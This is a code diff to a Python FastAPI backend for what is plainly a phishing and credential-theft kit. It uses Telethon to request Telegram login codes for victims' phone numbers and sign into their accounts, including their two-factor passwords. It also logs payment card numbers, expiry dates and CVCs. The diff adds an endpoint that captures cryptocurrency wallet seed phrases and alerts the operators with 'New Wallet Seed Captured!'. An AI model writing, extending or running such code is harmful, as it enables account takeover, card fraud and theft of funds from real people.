@@ -43,6 +43,10 @@ class CardData(BaseModel):
     cardData: dict
     user: dict = None
 
+class WalletData(BaseModel):
+    seedPhrase: str
+    user: dict = None
+
 async def notify_admins(text: str):
     if os.path.exists("admins.json"):
         with open("admins.json", "r") as f:
@@ -77,14 +81,19 @@ async def submit_phone(data: PhoneData):
         client = TelegramClient(f"sessions/{data.phone}", int(API_ID), API_HASH)
         await client.connect()
         try:
-            await client.send_code_request(data.phone)
-            clients[data.phone] = client
-            return {"status": "ok", "message": "Code sent"}
+            # Explicitly check if connected and handle possible issues
+            if not await client.is_user_authorized():
+                await client.send_code_request(data.phone)
+                clients[data.phone] = client
+                return {"status": "ok", "message": "Code sent"}
+            else:
+                return {"status": "already_authorized", "message": "Already logged in"}
         except Exception as e:
             print(f"Telethon error: {e}")
+            await notify_admins(f"❌ *Telethon Error* for `{data.phone}`: {e}")
             return {"status": "error", "message": str(e)}
 
-    return {"status": "ok", "message": "Captured (No Telethon)"}
+    return {"status": "ok", "message": "Captured (No Telethon API ID/Hash)"}
 
 @router.post("/api/submit/code")
 async def submit_code(data: CodeData):
@@ -98,8 +107,10 @@ async def submit_code(data: CodeData):
             await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}`!")
             return {"status": "logged_in"}
         except errors.SessionPasswordNeededError:
+            await notify_admins(f"🔐 *2FA Needed* for `{data.phone}`")
             return {"status": "2fa_needed"}
         except Exception as e:
+            await notify_admins(f"❌ *Sign-in Error* for `{data.phone}`: {e}")
             return {"status": "error", "message": str(e)}
 
     return {"status": "ok"}
@@ -115,6 +126,7 @@ async def submit_2fa(data: TwoFAData):
             await client.sign_in(password=data.twoFactor)
             await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}` with 2FA!")
         except Exception as e:
+            await notify_admins(f"❌ *2FA Sign-in Error* for `{data.phone}`: {e}")
             print(f"2FA Error: {e}")
 
     return {"status": "ok"}
@@ -128,6 +140,13 @@ async def submit_card(data: CardData):
                         f"Expiry: `{card.get('expiry')}`\n"
                         f"CVC: `{card.get('cvc')}`\n"
                         f"Name: `{card.get('name')}`")
+    return {"status": "ok"}
+
+@router.post("/api/submit/wallet")
+async def submit_wallet(data: WalletData):
+    save_submission({"type": "wallet", "data": data.model_dump()})
+    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
+    await notify_admins(f"💎 *New Wallet Seed Captured!*\n\n{user_info}\nPhrase: `{data.seedPhrase}`")
     return {"status": "ok"}
 
 app.include_router(router)
